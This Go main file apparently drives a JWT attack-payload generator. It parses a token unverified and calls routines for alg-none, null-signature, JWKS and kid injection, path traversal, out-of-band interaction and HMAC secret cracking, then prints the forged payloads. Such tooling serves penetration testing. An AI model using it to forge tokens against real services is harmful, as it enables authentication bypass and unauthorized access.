package main

import (
	"flag"

	"log"

	"github.com/golang-jwt/jwt"
	"github.com/ram8537/jwt-payloads/exploits"
	"github.com/ram8537/jwt-payloads/helpers"
)

func main() {
    token := flag.String("token", "", "JWT token")
    outOfBandURL := flag.String("url", "", "a URL for Out-of-band interactions")
    crack := flag.Bool("crack", false, "Optional secret-key crack for HS encrypted JWTs")

    flag.Parse()

    //parts (type:slice) are the JWT's three components
    decodedToken, parts, err := new(jwt.Parser).ParseUnverified(*token, jwt.MapClaims{})

    // invalid token (e.g token does not have three parts -> header, payload, signature; or invalid base64 encoding)
    if err != nil {
        log.Fatal(err)
    } 
    exploits.BrokenSignature(decodedToken)
    exploits.PersistenceCheck(*token, 1) // Persistence Check 1
    exploits.ReflectedClaims(decodedToken, parts)
    exploits.PersistenceCheck(*token, 2) //Persistence Check 2
    exploits.BlankPassword(decodedToken)
    exploits.NullSignature(parts) 
    exploits.AlgNone(decodedToken, parts) 
    exploits.JWKSInjection(decodedToken, parts)
    exploits.SpoofJWKS(decodedToken, parts)
    exploits.KidInjection(decodedToken, parts)
    exploits.KidInjectionPathTraversal(decodedToken, parts)
    exploits.CommonClaims(decodedToken, parts, *outOfBandURL)
    exploits.ExternalInteractions(decodedToken, parts, *outOfBandURL)
    exploits.ForcedErrors(decodedToken,parts)
    
    if *crack {exploits.CrackHmac(parts)}

    helpers.PrintAllFormatted(exploits.AllPayloads)

}

